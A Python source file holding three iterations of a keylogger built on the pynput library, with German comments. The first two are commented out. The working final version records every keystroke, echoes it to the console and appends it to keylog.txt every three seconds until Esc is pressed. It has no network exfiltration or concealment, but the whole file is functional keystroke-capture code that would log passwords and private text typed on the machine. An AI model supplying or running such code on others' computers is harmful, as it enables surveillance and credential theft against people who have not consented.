# from pynput import keyboard
# import threading


# class KeyLogger:
#     def __init__(self):
#         self.log = ""

#     def on_press(self, key):
#         try:
#             self.log += key.char
#         except AttributeError:
#             if key == keyboard.Key.space:
#                 self.log += " "
#             elif key == keyboard.Key.enter:
#                 self.log += "\n"
#             else:
#                 self.log += f"[{key}]"

#     def report(self):
#         print("Log:")
#         print(self.log)

#     def start(self):
#         with keyboard.Listener(on_press=self.on_press) as listener:
#             listener.join()


# def main():
#     logger = KeyLogger()
#     logger.start()


# if __name__ == "__main__":
#     main()


#------------

# from pynput import keyboard
# import threading
# import time


# class KeyLogger:
#     def __init__(self, filename="keylog.txt"):
#         self.filename = filename
#         self.log = []
#         self.running = True

#     def write_to_file(self):
#         """Schreibt Log in Datei."""
#         with open(self.filename, "a", encoding="utf-8") as f:
#             f.write("".join(self.log))
#         self.log = []

#     def on_press(self, key):
#         try:
#             self.log.append(key.char)
#         except AttributeError:
#             if key == keyboard.Key.space:
#                 self.log.append(" ")
#             elif key == keyboard.Key.enter:
#                 self.log.append("\n")
#             elif key == keyboard.Key.tab:
#                 self.log.append("\t")
#             elif key == keyboard.Key.esc:
#                 # Stop-Signal
#                 self.running = False
#                 return False
#             else:
#                 self.log.append(f"[{key}]")

#     def background_writer(self):
#         """Schreibt regelmäßig in Datei."""
#         while self.running:
#             time.sleep(5)
#             if self.log:
#                 self.write_to_file()

#     def start(self):
#         writer_thread = threading.Thread(target=self.background_writer, daemon=True)
#         writer_thread.start()

#         with keyboard.Listener(on_press=self.on_press) as listener:
#             listener.join()

#         # final flush
#         self.write_to_file()


# def main():
#     logger = KeyLogger()
#     logger.start()


# if __name__ == "__main__":
#     main()

#-------------

from pynput import keyboard
import threading
import time
import sys


class KeyLogger:
    def __init__(self, filename="keylog.txt"):
        self.filename = filename
        self.buffer = []
        self.running = True

    def write_to_file(self):
        """Schreibt Buffer in Datei."""
        if not self.buffer:
            return

        with open(self.filename, "a", encoding="utf-8") as f:
            f.write("".join(self.buffer))

        self.buffer.clear()

    def print_live(self, text):
        """Gibt Live-Input in Konsole aus."""
        sys.stdout.write(text)
        sys.stdout.flush()

    def on_press(self, key):
        try:
            char = key.char
            self.buffer.append(char)
            self.print_live(char)

        except AttributeError:
            if key == keyboard.Key.space:
                self.buffer.append(" ")
                self.print_live(" ")

            elif key == keyboard.Key.enter:
                self.buffer.append("\n")
                self.print_live("\n")

            elif key == keyboard.Key.tab:
                self.buffer.append("\t")
                self.print_live("\t")

            elif key == keyboard.Key.esc:
                self.running = False
                print("\n[STOP]")
                return False

            else:
                rep = f"[{key}]"
                self.buffer.append(rep)
                self.print_live(rep)

    def background_writer(self):
        """Schreibt regelmäßig in Datei."""
        while self.running:
            time.sleep(3)
            self.write_to_file()

        # final flush
        self.write_to_file()

    def start(self):
        writer = threading.Thread(target=self.background_writer, daemon=True)
        writer.start()

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()


def main():
    logger = KeyLogger()
    logger.start()


if __name__ == "__main__":
    main()